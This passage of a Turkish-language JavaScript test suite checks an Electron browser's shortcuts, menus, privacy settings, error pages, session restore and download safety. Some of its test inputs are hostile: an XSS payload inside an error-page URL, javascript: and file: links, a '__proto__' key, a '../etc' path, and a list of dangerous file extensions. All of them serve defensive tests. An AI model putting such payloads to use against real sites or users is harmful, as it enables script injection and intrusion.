  eq('IME birleştirmesi sırasında yakalanmaz', bc.commandForInput({ ...key('t', { ctrl: true }), isComposing: true }, { platform: 'win32' }), null);
  eq('Basılı tutulan Ctrl+T art arda sekme açmaz', win(key('t', { ctrl: true }, { repeat: true })), null);
  eq('Basılı tutulan Ctrl+Tab sekmeler arasında dolaşır', win(key('Tab', { ctrl: true }, { repeat: true })), 'next-tab');
  eq('Sayfada Ctrl+B (kalın), Ctrl+Shift+L (hizala), Ctrl+Shift+V (düz yapıştır) sayfaya bırakılır',
    [win(key('b', { ctrl: true })), win(key('L', { ctrl: true, shift: true })), win(key('V', { ctrl: true, shift: true }))], [null, null, null]);
  eq('Aynı birleşimler arayüz odaktayken panel açar',
    [win(key('b', { ctrl: true }), 'ui'), win(key('L', { ctrl: true, shift: true }), 'ui'), win(key('V', { ctrl: true, shift: true }), 'ui')],
    ['toggle-bookmarks', 'logs', 'vpn-panel']);
  eq('macOS: Cmd+T sekme açar, Ctrl+T açmaz',
    [bc.commandForInput(key('t', { meta: true }), { platform: 'darwin' }), bc.commandForInput(key('t', { ctrl: true }), { platform: 'darwin' })],
    ['new-tab', null]);
  eq('macOS: Ctrl+Tab sekme değiştirir', bc.commandForInput(key('Tab', { ctrl: true }), { platform: 'darwin' }), 'next-tab');

  let dupError = null;
  try { bc._internals.buildShortcutIndex([{ keys: ['Mod+T'], cmd: 'a' }, { keys: ['Mod+T'], cmd: 'b' }]); } catch (e) { dupError = e; }
  check('yinelenen kısayol tanımı yükleme anında hata verir', !!dupError);
  eq('"Mod++" ayrıştırması', bc._internals.parseShortcut('Mod++'), { mod: true, alt: false, shift: false, name: '+' });

  const appSrc = read('renderer/app.js');
  const uiCmds = [...new Set(bc.SHORTCUTS.map((s) => s.cmd).filter((c) => bc.UI_COMMANDS.has(c)))];
  const unhandledUi = uiCmds.filter((c) => !appSrc.includes("case '" + c + "'"));
  check("arayüze iletilen her komutun app.js'te karşılığı var", unhandledUi.length === 0, unhandledUi.join(', '));

  const mainJs = read('main/main.js');
  const mainCmds = [...new Set(bc.SHORTCUTS.map((s) => s.cmd).filter((c) => !bc.UI_COMMANDS.has(c) && !/^tab-\d$/.test(c)))];
  const unhandledMain = mainCmds.filter((c) => !mainJs.includes("case '" + c + "'"));
  check("ana süreçte yürütülen her komutun main.js'te karşılığı var", unhandledMain.length === 0, unhandledMain.join(', '));

  // Tek kaynak: renderer'da belge düzeyinde Ctrl kısayolu dinleyicisi kalmamalı.
  const rendererCtrl = fs.readdirSync(path.join(SRC, 'renderer')).filter((f) => f.endsWith('.js'))
    .filter((f) => /document\.addEventListener\(\s*['"]keydown['"][\s\S]{0,400}?(ctrlKey|metaKey)/.test(read('renderer/' + f)));
  check("renderer'da belge düzeyinde Ctrl kısayol dinleyicisi yok", rendererCtrl.length === 0, rendererCtrl.join(', '));
  check('sekmeler, önizleme, ana ve gizli pencere before-input-event ile bağlı',
    (mainJs.match(/bindBrowserInput\(/g) || []).length >= 5 && mainJs.includes("'before-input-event'"));
}

suite('Sağ tık menüsü');
{
  const ids = (model) => model.filter((i) => !i.type).map((i) => i.id);
  const page = (p, ctx = {}) => bc.buildContextMenuModel(p, { platform: 'win32', ...ctx });

  const linkMenu = page({ linkURL: 'https://ornek.com/a', pageURL: 'https://ornek.com/' });
  eq('bağlantı menüsü', ids(linkMenu), ['open-link-tab', 'open-link-incognito', 'glance-link', 'save-link', 'copy-text']);
  check('gizli pencerede "gizli pencerede aç" gösterilmez',
    !ids(page({ linkURL: 'https://ornek.com/' }, { incognito: true })).includes('open-link-incognito'));
  eq('javascript: bağlantısında menü açılmaz', ids(page({ linkURL: 'javascript:alert(1)', pageURL: 'https://ornek.com/' })), []);
  eq('file: bağlantısında menü açılmaz', ids(page({ linkURL: 'file:///C:/Windows/win.ini', pageURL: 'https://ornek.com/' })), []);
  eq('mailto: yalnızca adresi kopyalar',
    page({ linkURL: 'mailto:ali%40ornek.com?subject=x' }).filter((i) => !i.type).map((i) => [i.id, i.arg]), [['copy-text', 'ali@ornek.com']]);

  const img = page({ mediaType: 'image', srcURL: 'https://ornek.com/r.png', x: 10, y: 20, pageURL: 'https://ornek.com/' });
  eq('resim menüsü', ids(img), ['open-tab', 'save-media', 'copy-image', 'copy-text']);
  eq('data: resim kaydedilir ama yeni sekmede açılmaz', ids(page({ mediaType: 'image', srcURL: 'data:image/png;base64,AAAA' })), ['save-media', 'copy-image']);
  eq('data:text/html resim sayılmaz', ids(page({ mediaType: 'image', srcURL: 'data:text/html,<b>x</b>' })), []);

  const sel = page({ selectionText: '  İlgezdi   tarayıcı  ', pageURL: 'https://ornek.com/' });
  eq('seçim menüsü', ids(sel), ['copy', 'search-selection']);
  eq('arama etiketi sadeleşir', sel.find((i) => i.id === 'search-selection').label, '“İlgezdi tarayıcı” için ara');
  eq('sayfa menüsü', ids(page({ pageURL: 'https://ornek.com/' })), ['back', 'forward', 'reload', 'print', 'view-source']);
  eq('geri/ileri etkinliği geçmişe göre',
    page({ pageURL: 'https://ornek.com/' }, { canGoBack: true }).filter((i) => i.id === 'back' || i.id === 'forward').map((i) => i.enabled), [true, false]);

  const edit = page({ isEditable: true, misspelledWord: 'tarayci', dictionarySuggestions: ['tarayıcı', 'tarayıcıyı'], editFlags: { canCopy: true, canPaste: true } });
  eq('yazım önerileri en üstte', ids(edit).slice(0, 3), ['replace-misspelling', 'replace-misspelling', 'add-to-dictionary']);
  eq('düzenleme bayrakları', edit.filter((i) => ['undo', 'cut', 'copy', 'paste'].includes(i.id)).map((i) => i.enabled), [false, false, true, true]);
  eq('sayfa metnindeki & Windows menüsünde && olur', page({ selectionText: 'A & B' }).find((i) => i.id === 'search-selection').label, '“A && B” için ara');
  eq('macOS menüsünde & olduğu gibi kalır',
    bc.buildContextMenuModel({ selectionText: 'A & B' }, { platform: 'darwin' }).find((i) => i.id === 'search-selection').label, '“A & B” için ara');
  eq('arayüzde yalnızca kopyala', ids(bc.buildContextMenuModel({ selectionText: 'x', linkURL: 'https://a.com' }, { surface: 'ui', platform: 'win32' })), ['copy']);
  check('menü ayraçla başlamaz ve bitmez', [linkMenu, img, sel, edit].every((m) => !m[0].type && !m[m.length - 1].type));
  check("sağ tık eylemleri adresleri yeniden süzüyor (main.js)",
    /case 'open-link-tab':[\s\S]{0,120}isWebUrl\(arg\)/.test(read('main/main.js')));
}

suite('Yakınlaştırma ve kapatılan sekmeler');
{
  eq('büyütme adımları', [bc.nextZoomFactor(1, 1), bc.nextZoomFactor(1.1, 1), bc.nextZoomFactor(5, 1)], [1.1, 1.25, 5]);
  eq('küçültme adımları', [bc.nextZoomFactor(1, -1), bc.nextZoomFactor(0.25, -1)], [0.9, 0.25]);
  eq('sıfırla', bc.nextZoomFactor(2.5, 0), 1);
  eq('adım dışı değerden sonraki adım', bc.nextZoomFactor(1.17, 1), 1.25);
  eq('site anahtarı', [bc.zoomKeyForUrl('https://WWW.Ornek.com:8443/a?b'), bc.zoomKeyForUrl('file:///C:/x.html'), bc.zoomKeyForUrl('about:blank')],
    ['www.ornek.com', '', '']);

  let written = null;
  const store = bc.createZoomStore({
    read: () => ({ 'a.com': 1.5, 'bozuk.com': 'x', 'dev.com': 99, 'bir.com': 1 }),
    write: (o) => { written = o; },
    delayMs: 5,
  });
  eq('bozuk ve sınır dışı değerler yüklenmez', [store.get('a.com'), store.get('bozuk.com'), store.get('dev.com'), store.size()], [1.5, 1, 1, 1]);
  store.set('b.com', 2);
  store.set('a.com', 1);
  check('yazma gecikmeli (her tekerlek adımında diske yazılmaz)', written === null && store.pending());
  store.flush();
  eq('%100 kaydedilmez, değişen yazılır', written, { 'b.com': 2 });
  for (let i = 0; i < 520; i++) store.set('s' + i + '.com', 1.25);
  store.flush();
  eq('en fazla 500 site tutulur, en eskisi düşer', [Object.keys(written).length, 'b.com' in written, 's519.com' in written], [500, false, true]);

  const E = (u) => ({ url: u, title: u });
  eq('geçmiş: web dışı girdiler atılır, etkin konum korunur',
    bc.snapshotHistory([E('about:blank'), E('https://a.com/'), E('https://b.com/'), E('chrome-error://x')], 2),
    { entries: [E('https://a.com/'), E('https://b.com/')], index: 1 });
  eq('geçmiş: etkin girdi atıldıysa son web girdisi', bc.snapshotHistory([E('https://a.com/'), E('about:blank')], 1).index, 0);
  const snap = bc.snapshotHistory(Array.from({ length: 60 }, (_, i) => E('https://s.com/' + i)), 59);
  eq('geçmiş en fazla 50 girdi, etkin konum kayar', [snap.entries.length, snap.index, snap.entries[snap.index].url], [50, 49, 'https://s.com/59']);

  const stack = [];
  check('boş sekme yığına girmez', bc.pushClosedTab(stack, { url: 'about:blank' }) === false && stack.length === 0);
  for (let i = 0; i < 30; i++) bc.pushClosedTab(stack, { url: 'https://s.com/' + i });
  eq('yığın en fazla 25 sekme', [stack.length, stack[0].url, stack[24].url], [25, 'https://s.com/5', 'https://s.com/29']);
  check('site yakınlaştırması config.json yerine ayrı dosyada', read('main/main.js').includes("path.join(USER_DATA, 'zoom-levels.json')"));
}

suite('WebRTC IP koruması ve gizli pencere önizlemesi');
{
  eq('geçerli politikalar olduğu gibi kalır', bc.WEBRTC_POLICIES.map(bc.normalizeWebrtcPolicy), [...bc.WEBRTC_POLICIES]);
  eq('geçersiz değer varsayılana döner', [bc.normalizeWebrtcPolicy('herkese-ac'), bc.normalizeWebrtcPolicy(undefined)],
    ['default_public_interface_only', 'default_public_interface_only']);
  const mainJs = read('main/main.js');
  check('varsayılan yapılandırmada politika tanımlı', /webrtcPolicy:\s*DEFAULT_WEBRTC_POLICY/.test(mainJs));
  const createTabBody = mainJs.slice(mainJs.indexOf('function createTab('), mainJs.indexOf('function resizeActiveView('));
  check('her sekme oluşturulurken politika uygulanıyor', createTabBody.includes('applyWebrtcPolicy(view.webContents)'));
  check('ayar kaydında politika doğrulanıyor ve açık sekmelere uygulanıyor',
    /incoming\.webrtcPolicy\s*=\s*normalizeWebrtcPolicy/.test(mainJs) && mainJs.includes('applyWebrtcPolicyToAllTabs()'));
  check('önizleme görünümüne de politika uygulanıyor', /onViewCreated[\s\S]{0,400}applyWebrtcPolicy\(view\.webContents\)/.test(mainJs));
  check('önizleme bölümü sabit değil, pencereye göre seçiliyor (gizli pencere → gizli oturum)',
    read('main/glance-main.js').includes('hooks.partitionFor') && /partitionFor:[\s\S]{0,200}incognito-/.test(mainJs));
  // Önizleme açıkken pencere kapanınca korumasız send() ana süreci düşürüyordu (P0 sondası buldu).
  const glanceJs = read('main/glance-main.js');
  check('önizleme pencereye yalnızca güvenli yardımcıyla mesaj gönderiyor',
    glanceJs.split('.webContents.send(').length - 1 === 1 && glanceJs.includes('win.webContents.isDestroyed()'));
  check('önizlemenin penceresi kapanınca önizleme durumu sıfırlanıyor', glanceJs.includes("win.on('closed'"));
  check('ayarlarda WebRTC seçimi var ve kaydediliyor', read('renderer/settings-panel.js').includes("getElementById('cfg-webrtc')?.value"));
}

suite('Erişilebilirlik tabanı');
{
  const html = read('renderer/index.html');
  check('a11y.js arayüzde yükleniyor', /<script src="a11y\.js"><\/script>/.test(html));
  check('sekme şeridi tablist, sekmeler tab rolünde', html.includes('role="tablist"') && read('renderer/app.js').includes("setAttribute('role', 'tab')"));
  check('adres çubuğunun erişilebilir adı var', /id="address-bar"[\s\S]{0,200}aria-label=/.test(html));
  check('klavye odak göstergesi tanımlı (:focus-visible)', /:focus-visible\s*\{[^}]*outline:\s*2px/.test(read('renderer/styles/main.css')));
  const unnamed = [...html.matchAll(/<button\b([^>]*)>([\s\S]*?)<\/button>/g)].filter(([, attrs, inner]) => {
    if (/\b(aria-label|title)=/.test(attrs)) return false;
    const text = inner.replace(/<[^>]+>/g, '').replace(/\s+/g, '');
    return !/[\p{L}\p{N}]/u.test(text);
  }).map(([, attrs]) => (attrs.match(/id="([^"]+)"/) || [])[1] || attrs.trim().slice(0, 40));
  check('index.html içindeki her düğmenin erişilebilir adı var', unnamed.length === 0, unnamed.join(', '));
  check('dekoratif runik şerit ekran okuyucudan gizli', /id="status-runes"[^>]*aria-hidden="true"/.test(html));
}

// ══════════════════════════════════════════════════════════════════════════════
// Site güvenliği — açılır pencere, izinler, üçüncü taraf çerez, güvenli DNS,
// hata sayfası ve sertifika (karşılaştırma raporu P1-A)
// ══════════════════════════════════════════════════════════════════════════════
const ss = require('../src/main/site-safety.js');

suite('Açılır pencere engelleme');
{
  const now = 1000000;
  eq('etkileşimsiz pencere engellenir', ss.popupVerdict({ now }), 'block');
  eq('tıklamadan hemen sonra izin', ss.popupVerdict({ now, lastActivation: now - 20 }), 'allow');
  eq('5 saniye sınırı dahil', ss.popupVerdict({ now, lastActivation: now - 5000 }), 'allow');
  eq('5 saniyeden eski etkileşim yetmez', ss.popupVerdict({ now, lastActivation: now - 5001 }), 'block');
  eq('gelecekteki zaman damgası kabul edilmez', ss.popupVerdict({ now, lastActivation: now + 100 }), 'block');
  eq('site için izin verildiyse etkileşimsiz de açılır', ss.popupVerdict({ now, siteDecision: true }), 'allow');
  eq('site engellendiyse tıklamayla da açılmaz', ss.popupVerdict({ now, lastActivation: now, siteDecision: false }), 'block');
  check('fare hareketi ve tekerlek etkileşim sayılmaz',
    !ss.ACTIVATION_EVENTS.has('mouseMove') && !ss.ACTIVATION_EVENTS.has('mouseWheel') && ss.ACTIVATION_EVENTS.has('mouseDown'));
  const mainJs = read('main/main.js');
  check('etkileşim bir kez kullanılıyor (tek tıklama = tek pencere)', mainJs.includes('tab.lastActivation = 0'));
  check('target=_blank ve window.open yeni sekmeye geçiyor, Ctrl/orta tık arka planda',
    mainJs.includes("if (disposition !== 'background-tab') setActiveTab(win, state, newId);"));
}

suite('Site izinleri');
{
  eq('geçerli origin', ss.normalizeOrigin('https://ornek.com:8443'), 'https://ornek.com:8443');
  eq('yol ya da sondaki eğik çizgi origin değildir', [ss.normalizeOrigin('https://ornek.com/'), ss.normalizeOrigin('https://ornek.com/a')], [null, null]);
  eq('file: ve javascript: reddedilir', [ss.normalizeOrigin('file:///C:/'), ss.normalizeOrigin('javascript:alert(1)')], [null, null]);
  eq('izin verme', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'geolocation', decision: 'allow' }),
    { ok: true, origin: 'https://a.com', permission: 'geolocation', value: true });
  eq('"sor" kaydı siler', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'popups', decision: 'ask' }).value, null);
  check('bilinmeyen izin reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'usb', decision: 'allow' }).ok === false);
  check('geçersiz karar reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: 'media', decision: true }).ok === false);
  check('prototip anahtarı reddedilir', ss.validatePermissionChange({ origin: 'https://a.com', permission: '__proto__', decision: 'allow' }).ok === false);
  const decisions = {
    'https://b.com|media': false, 'https://a.com|popups': true, 'https://a.com|geolocation': true,
    'bozuk': true, 'https://c.com|usb': true, 'https://d.com|media': 'evet',
  };
  eq('liste: bozuk ve bilinmeyen kayıtlar atlanır, site ve izin sırasına göre',
    ss.listDecisions(decisions).map((d) => [d.origin, d.permission, d.decision]),
    [['https://a.com', 'geolocation', 'allow'], ['https://a.com', 'popups', 'allow'], ['https://b.com', 'media', 'block']]);
  const forA = Object.fromEntries(ss.decisionsForOrigin(decisions, 'https://a.com').map((p) => [p.permission, p.decision]));
  eq('site görünümü: kayıt yoksa sor, çerezde varsayılan',
    [forA.geolocation, forA.media, forA.popups, forA['third-party-cookies']], ['allow', 'ask', 'allow', 'default']);
  const mainJs = read('main/main.js');
  check('arayüz izin kararlarını ve oturumu göremez, geri yazamaz',
    mainJs.includes("const MAIN_OWNED_KEYS = ['permissionDecisions', 'authSessionEnc'];")
    && mainJs.includes("ipcMain.handle('get-config',  ()          => publicConfig());")
    && mainJs.includes('for (const k of MAIN_OWNED_KEYS) delete incoming[k];'));
  check('site verisi silme ve toplu sıfırlama kullanıcı onayı istiyor',
    /'site-data-clear'[\s\S]{0,700}showMessageBox/.test(mainJs) && /'site-permissions-reset'[\s\S]{0,400}showMessageBox/.test(mainJs));
}

suite('Üçüncü taraf çerezler');
{
  const base = { enabled: true, resourceType: 'image', thirdParty: true, siteAllowed: undefined, whitelisted: false };
  eq('üçüncü taraf istekte çerez ayıklanır', ss.shouldStripThirdPartyCookies(base), true);
  eq('ayar kapalıyken dokunulmaz', ss.shouldStripThirdPartyCookies({ ...base, enabled: false }), false);
  eq('kullanıcının gittiği sayfa (ana çerçeve) birinci taraftır', ss.shouldStripThirdPartyCookies({ ...base, resourceType: 'mainFrame' }), false);
  eq('aynı site istekleri etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, thirdParty: false }), false);
  eq('site için izin verildiyse etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, siteAllowed: true }), false);
  eq('engelleyici beyaz listesindeki sitede etkilenmez', ss.shouldStripThirdPartyCookies({ ...base, whitelisted: true }), false);
  const blockerMod = require('../src/main/blocker-main.js');
  check('engelleyicinin site tanımı dışa açık (tek tanım)', typeof blockerMod.isThirdParty === 'function' && typeof blockerMod.isWhitelisted === 'function');
  eq('alt alan adı aynı sitedir, başka alan adı üçüncü taraftır',
    [blockerMod.isThirdParty('https://cdn.ornek.com.tr/a.js', 'https://www.ornek.com.tr/'), blockerMod.isThirdParty('https://izleyici.net/p', 'https://ornek.com/')],
    [false, true]);
  const mainJs = read('main/main.js');
  check('hem istek (Cookie) hem yanıt (Set-Cookie) başlığı ayıklanıyor',
    mainJs.includes("k.toLowerCase() === 'cookie'") && mainJs.includes("k.toLowerCase() === 'set-cookie'") && mainJs.includes('onHeadersReceived'));
}

suite('Güvenli DNS');
{
  eq('otomatik', ss.hostResolverOptions('automatic'), { secureDnsMode: 'automatic' });
  eq('kapalı', ss.hostResolverOptions('off'), { secureDnsMode: 'off' });
  eq('sağlayıcı seçilince yalnızca o sunucu', ss.hostResolverOptions('quad9'), { secureDnsMode: 'secure', secureDnsServers: ['https://dns.quad9.net/dns-query'] });
  eq('geçersiz değer otomatiğe döner', [ss.normalizeSecureDns('http://kotu.example/dns'), ss.hostResolverOptions('x')], ['automatic', { secureDnsMode: 'automatic' }]);
  check('tüm sağlayıcı adresleri https', ss.SECURE_DNS_OPTIONS.filter((o) => o.server).every((o) => o.server.startsWith('https://')));
  const mainJs = read('main/main.js');
  check('varsayılan yapılandırmada kullanılmayan dnsServer yerine secureDns', !mainJs.includes('dnsServer:') && /secureDns:\s*DEFAULT_SECURE_DNS/.test(mainJs));
  check('açılışta ve ayar değişince uygulanıyor', (mainJs.match(/applySecureDns\(\);/g) || []).length >= 2);
  check('ayarlarda seçim var ve kaydediliyor', read('renderer/settings-panel.js').includes("getElementById('cfg-secure-dns')?.value"));
}

suite('Hata sayfası ve sertifika');
{
  const m = (code, extra = {}) => ss.errorPageModel({ code, description: 'ERR_X', url: 'https://ornek.com/a', ...extra });
  eq('türler', [m(-105).kind, m(-106).kind, m(-102).kind, m(-201).kind, m(-107).kind, m(-310).kind, m(-20).kind, m(-999).kind],
    ['dns', 'offline', 'unreachable', 'certificate', 'certificate', 'redirects', 'blocked', 'generic']);
  eq('sertifika hatasında neden açıklanır', m(-201).reason, 'Sertifikanın süresi dolmuş ya da henüz geçerli değil.');
  check('sertifika hatasında "yine de devam et" seçeneği yok', !/yine de/i.test(JSON.stringify(m(-202))));
  check('Yalnızca HTTPS açıkken ilgili hatada ipucu başta', m(-102, { httpsOnly: true }).tips[0].startsWith('Yalnızca HTTPS açık'));
  check('DNS hatasında HTTPS ipucu yok', !m(-105, { httpsOnly: true }).tips.some((t) => t.startsWith('Yalnızca HTTPS')));
  eq('hata adı yalnızca büyük harf, rakam ve alt çizgi', ss.errorPageModel({ code: -105, description: 'ERR_NAME<script>', url: 'https://a.com' }).codeName, 'ERR_NAME');
  eq('web dışı adreste "yeniden dene" yok', ss.errorPageModel({ code: -105, url: 'javascript:alert(1)' }).canRetry, false);

  const evil = ss.errorPageModel({ code: -105, description: 'ERR_NAME_NOT_RESOLVED', url: 'https://a.com/"</script><img src=x onerror=alert(1)>\u2028\'' });
  const script = ss.errorPageScript(evil);
  let compiled = true;
  try { new Function(script); } catch { compiled = false; }
  check('kötü niyetli adres içeren hata betiği geçerli JavaScript olarak kalıyor', compiled);
  check("hata betiği DOM'a innerHTML ile yazmıyor", !script.includes('innerHTML'));
  check('hata betiği yalnızca Chromium hata belgesine dokunuyor', script.includes("indexOf('chrome-error://') !== 0"));

  const cert = ss.certificateSummary({ subjectName: 'ornek.com', issuerName: 'R3', issuer: { organizations: ["Let's Encrypt"] }, validStart: 1700000000, validExpiry: 1710000000, fingerprint: 'sha256/abc' }, 'net::OK', 0);
  eq('sertifika özeti', [cert.subject, cert.issuerOrg, cert.validFrom, cert.ok, cert.error], ['ornek.com', "Let's Encrypt", 1700000000000, true, '']);
  eq('doğrulama hatası özette görünür', ss.certificateSummary({}, 'net::ERR_CERT_AUTHORITY_INVALID', -202).error, 'Sertifika güvenilen bir kuruluş tarafından verilmemiş.');
  const mainJs = read('main/main.js');
  check('sertifika kancası kararı değiştirmiyor ve her durumda geri çağırıyor', mainJs.includes('finally { callback(-3); }'));
  check('hata sayfası yalnızca ana çerçevede ve iptal olmayan hatalarda', mainJs.includes('if (!isMainFrame || errorCode === -3) return;'));
  const html = read('renderer/index.html');
  check('site bilgisi paneli ve kilit düğmesi arayüzde', html.includes('id="panel-siteinfo"') && html.includes('<button type="button" id="security-icon"'));
}

// ══════════════════════════════════════════════════════════════════════════════
// Sekmeler — sıralama, sabitleme, sekme menüsü, oturum, tam ekran (P1-B)
// ══════════════════════════════════════════════════════════════════════════════
suite('Sekme düzeni ve sekme menüsü');
{
  const pins = (...ids) => new Set(ids);
  eq('taşıma', bc.moveTabId([1, 2, 3, 4], pins(), 4, 1), [1, 4, 2, 3]);
  eq('sabitsiz sekme sabitli grubun önüne geçemez', bc.moveTabId([1, 2, 3], pins(1), 3, 0), [1, 3, 2]);
  eq('sabitli sekme sabitsiz gruba geçemez', bc.moveTabId([1, 2, 3], pins(1, 2), 1, 3), [2, 1, 3]);
  eq('aralık dışı hedef sona sıkıştırılır', bc.moveTabId([1, 2, 3], pins(), 1, 99), [2, 3, 1]);
  eq('bilinmeyen sekme sırayı değiştirmez', bc.moveTabId([1, 2], pins(), 9, 0), [1, 2]);
  eq('sabitlenen sekme sabitli grubun sonuna gider', bc.orderAfterPin([1, 2, 3, 4], pins(1, 4), 4), [1, 4, 2, 3]);
  eq('sabitlemesi kaldırılan sekme sabitsiz grubun başına gider', bc.orderAfterPin([1, 2, 3], pins(2), 1), [2, 1, 3]);

  const menu = bc.buildTabMenuModel({ index: 2, count: 3, pinned: false, muted: false, canReopen: false, platform: 'win32' });
  const ids = menu.filter((i) => !i.type).map((i) => i.id);
  eq('sekme menüsü', ids, ['new-tab-right', 'reload', 'duplicate', 'pin', 'mute', 'close', 'close-others', 'close-right', 'reopen-closed']);
  eq('son sekmede "sağdakileri kapat" ve yığın boşken "yeniden aç" pasif',
    menu.filter((i) => i.id === 'close-right' || i.id === 'reopen-closed').map((i) => i.enabled), [false, false]);
  eq('sabitli ve sessiz sekmede ters işlemler',
    bc.buildTabMenuModel({ index: 0, count: 1, pinned: true, muted: true }).filter((i) => !i.type).map((i) => i.id).slice(3, 5), ['unpin', 'unmute']);
  const allMenuIds = [true, false].flatMap((p) => [true, false].flatMap((m) =>
    bc.buildTabMenuModel({ index: 0, count: 2, pinned: p, muted: m }).filter((i) => !i.type).map((i) => i.id)));
  check('menüdeki her işlem IPC beyaz listesinde', allMenuIds.every((id) => bc.TAB_ACTIONS.has(id)), allMenuIds.filter((id) => !bc.TAB_ACTIONS.has(id)));
  eq('F11 → tam ekran', bc.commandForInput({ type: 'keyDown', key: 'F11', code: 'F11' }, { platform: 'win32' }), 'toggle-fullscreen');
  const mainJs = read('main/main.js');
  check("tab-action IPC'si yalnızca beyaz listedeki işlemleri kabul ediyor", /'tab-action'[\s\S]{0,200}if \(!TAB_ACTIONS\.has\(action\)\) return/.test(mainJs));
}

suite('Oturum geri yükleme');
{
  eq('başlangıç modu', [bc.normalizeStartupMode('restore'), bc.normalizeStartupMode('bozuk'), bc.normalizeStartupMode()], ['restore', 'homepage', 'homepage']);
  const E = (u) => ({ url: u, title: 'T ' + u, pageState: 'form-verisi' });
  const s = bc.serializeSession([
    { url: 'about:blank', title: 'Yeni Sekme' },
    { url: 'https://a.com/', title: 'A', pinned: true, entries: [E('https://a.com/')], index: 0 },
    { url: 'https://b.com/2', title: 'B', entries: [E('about:blank'), E('https://b.com/1'), E('https://b.com/2')], index: 2 },
  ], 2);
  eq('boş sekme kaydedilmez, etkin sekme konumu kayar', [s.tabs.length, s.activeIndex, s.version], [2, 1, 1]);
  eq('girdilerde web dışı atılır, etkin konum korunur', [s.tabs[1].entries.map((e) => e.url), s.tabs[1].index], [['https://b.com/1', 'https://b.com/2'], 1]);
  check('form içeriği taşıyabilen pageState diske yazılmaz', !JSON.stringify(s).includes('form-verisi'));

  const roundTrip = bc.parseSession(JSON.parse(JSON.stringify(s)));
  eq('kaydedilen oturum geri okunur', [roundTrip.tabs.map((t) => t.url), roundTrip.activeIndex, roundTrip.tabs[0].pinned], [['https://a.com/', 'https://b.com/2'], 1, true]);
  eq('sürüm uymazsa ya da sekme yoksa null', [bc.parseSession({ version: 2, tabs: [] }), bc.parseSession({ version: 1, tabs: [{ url: 'file:///C:/x' }] }), bc.parseSession(null)], [null, null, null]);
  const tampered = bc.parseSession({ version: 1, activeIndex: 0, tabs: [
    { url: 'https://x.com/', pinned: 'evet', entries: [{ url: 'javascript:alert(1)' }, { url: 'https://x.com/' }], index: 7 },
    { url: 'https://y.com/', pinned: true },
  ] });
  eq('elle bozulmuş dosya: sabitli önde, geçersiz girdi atılır, konum sınırda, etkin sekme izlenir',
    [tampered.tabs.map((t) => t.url), tampered.tabs[1].pinned, tampered.tabs[1].entries.length, tampered.tabs[1].index, tampered.activeIndex],
    [['https://y.com/', 'https://x.com/'], false, 1, 0, 1]);
  eq('en fazla 100 sekme', bc.serializeSession(Array.from({ length: 130 }, (_, i) => ({ url: 'https://s.com/' + i })), 0).tabs.length, 100);

  const mainJs = read('main/main.js');
  const snapBody = mainJs.slice(mainJs.indexOf('function sessionSnapshot('), mainJs.indexOf('function writeProtectedJson('));
  check('oturuma yalnızca ana pencere yazılıyor (gizli pencere asla)', snapBody.includes('mainState.tabs') && !snapBody.includes('incognitoState'));
  check('oturum dosyası ziyaret günlüğü anahtarıyla şifreleniyor',
    mainJs.includes('writeProtectedJson(SESSION_ENC, SESSION_PLAIN, sessionSnapshot())') && mainJs.includes('write(encPath, secureLog._encrypt(data));'));
  check('pencere kapanırken sekmeler kapanmadan önce eşzamanlı kaydediliyor', mainJs.includes("mainWindow.on('close', () => saveSessionNow());"));
  check('"Kaldığım yerden" kapatılınca ve "Tüm verileri temizle"de oturum dosyası siliniyor', (mainJs.match(/deleteSessionFiles\(\);/g) || []).length >= 2);
  check('arka plan sekmeleri ilk açılışta yükleniyor', mainJs.includes('lazy: i !== saved.activeIndex') && mainJs.includes('if (tab.pendingLoad) {'));
}

suite('Tam ekran');
{
  const mainJs = read('main/main.js');
  const resizeBody = mainJs.slice(mainJs.indexOf('function resizeActiveView('), mainJs.indexOf('function setActiveTab('));
  check('video tam ekranında sekme görünümü tüm pencereye yayılıyor', /if \(state\.htmlFullscreen\)[\s\S]{0,200}setBounds\(\{ x: 0, y: 0, width: full\.width, height: full\.height \}\)/.test(resizeBody));
  check('tam ekran uyarısı betik çalıştırmayan ayrı görünümde', /new WebContentsView\(\{ webPreferences: \{ sandbox: true, contextIsolation: true, javascript: false \} \}\)/.test(mainJs));
  check('sekme değişince video tam ekranından çıkılıyor', /if \(state\.htmlFullscreen\) \{[\s\S]{0,400}exitFullscreen/.test(mainJs));
}

// ══════════════════════════════════════════════════════════════════════════════
// Geçmiş ve indirilenler — indirme güvenliği, kalıcı geçmiş (P1-C)
// ══════════════════════════════════════════════════════════════════════════════
suite('İndirme güvenliği ve indirme geçmişi');
{
  eq('uzantı: büyük harf, sondaki nokta ve boşluk, çift uzantı, gizli dosya',
    [ss.fileExtension('Kurulum.EXE'), ss.fileExtension('a.exe.'), ss.fileExtension('a.exe  '), ss.fileExtension('arsiv.tar.gz'), ss.fileExtension('.bashrc'), ss.fileExtension('uzantisiz')],
    ['exe', 'exe', 'exe', 'gz', '', '']);
  eq('tehlikeli türler', [ss.isDangerousFile('setup.msi'), ss.isDangerousFile('betik.PS1'), ss.isDangerousFile('rapor.pdf'), ss.isDangerousFile('fatura.pdf.exe'), ss.isDangerousFile('disk.iso')],
    [true, true, false, true, true]);
  eq('güvenli kaynak',
    [ss.isSecureSource('https://a.com/x.exe'), ss.isSecureSource('http://localhost:3000/x'), ss.isSecureSource('http://127.0.0.5/x'), ss.isSecureSource('http://[::1]/x'),
     ss.isSecureSource('http://a.com/x'), ss.isSecureSource('ftp://a.com/x'), ss.isSecureSource('blob:https://a.com/1')],
    [true, true, true, true, false, false, true]);
  eq('uyarı yalnızca güvensiz kaynaktan gelen tehlikeli dosyada',
    [ss.downloadNeedsWarning({ filename: 'a.exe', url: 'http://a.com/a.exe' }), ss.downloadNeedsWarning({ filename: 'a.exe', url: 'https://a.com/a.exe' }), ss.downloadNeedsWarning({ filename: 'a.zip', url: 'http://a.com/a.zip' })],
    [true, false, false]);
  eq('günlük kimliği süzgeci', ss.sanitizeLogIds(['log_1726400000000_ab12c', 'log_1726400000000_ab12c', '../etc', { id: 1 }, 'log_1_x']), ['log_1726400000000_ab12c']);
  const hist = ss.sanitizeDownloadHistory([
